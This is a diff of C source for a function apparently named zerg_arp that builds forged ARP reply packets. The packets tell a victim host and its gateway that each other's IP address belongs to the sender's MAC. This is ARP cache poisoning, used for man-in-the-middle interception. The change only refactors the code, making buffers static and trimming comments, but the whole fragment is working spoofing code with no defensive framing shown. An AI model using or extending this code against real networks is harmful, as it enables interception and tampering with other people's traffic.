@@ -57,20 +57,23 @@ void* zerg_arp(void* targets) {
     static uint8_t cbuf[sizeof(struct ether_header) + sizeof(struct ether_arp)];
     static uint8_t gbuf[sizeof(struct ether_header) + sizeof(struct ether_arp)];
 
+    static struct ether_header* ceh = (struct ether_header*)cbuf;
+    static struct ether_header* geh = (struct ether_header*)gbuf;
+
+    static struct ether_arp* cea = (struct ether_arp*)(cbuf + sizeof(struct ether_header));
+    static struct ether_arp* gea = (struct ether_arp*)(gbuf + sizeof(struct ether_header));
+
+    static struct sockaddr_ll caddr = {0};
+    static struct sockaddr_ll gaddr = {0};
+
     memset(cbuf, 0, sizeof(struct ether_header) + sizeof(struct ether_arp));
     memset(gbuf, 0, sizeof(struct ether_header) + sizeof(struct ether_arp));
 
-    struct ether_header* ceh = (struct ether_header*)cbuf;
-    struct ether_header* geh = (struct ether_header*)gbuf;
-
-    struct ether_arp* cea = (struct ether_arp*)(cbuf + sizeof(struct ether_header));
-    struct ether_arp* gea = (struct ether_arp*)(gbuf + sizeof(struct ether_header));
-
-    //set target mac address
+    //target mac address
     memcpy(ceh->ether_dhost, t.cmac, 6);
     memcpy(geh->ether_dhost, t.gmac, 6);
 
-    //set sender mac address
+    //sender mac address
     memcpy(ceh->ether_shost, t.omac, 6);
     memcpy(geh->ether_shost, t.omac, 6);
 
@@ -90,29 +93,24 @@ void* zerg_arp(void* targets) {
     cea->arp_pln = sizeof(in_addr_t);
     gea->arp_pln = sizeof(in_addr_t);
 
-    //arp reply
     cea->arp_op = htons(ARPOP_REPLY);
     gea->arp_op = htons(ARPOP_REPLY);
 
-    //set sender mac address
+    //sender mac
     memcpy(cea->arp_sha, t.omac, 6);
     memcpy(gea->arp_sha, t.omac, 6);
 
-    //set sender ip address
-    //memcpy(cea->arp_spa, (victim_ip == gateway_ip) ? &target_ip : &gateway_ip, 4);
+    //sender ip
     memcpy(cea->arp_spa, &t.gip, 4);
     memcpy(gea->arp_spa, &t.cip, 4);
 
-    //set target mac address
+    //target mac
     memcpy(cea->arp_tha, t.cmac, 6);
     memcpy(gea->arp_tha, t.gmac, 6);
 
-    //set target ip address
+    //target ip
     memcpy(cea->arp_tpa, &t.cip, 4);
     memcpy(gea->arp_tpa, &t.gip, 4);
-
-    struct sockaddr_ll caddr = {0};
-    struct sockaddr_ll gaddr = {0};
 
     caddr.sll_family   = AF_PACKET;
     caddr.sll_ifindex  = IF_INDEX;
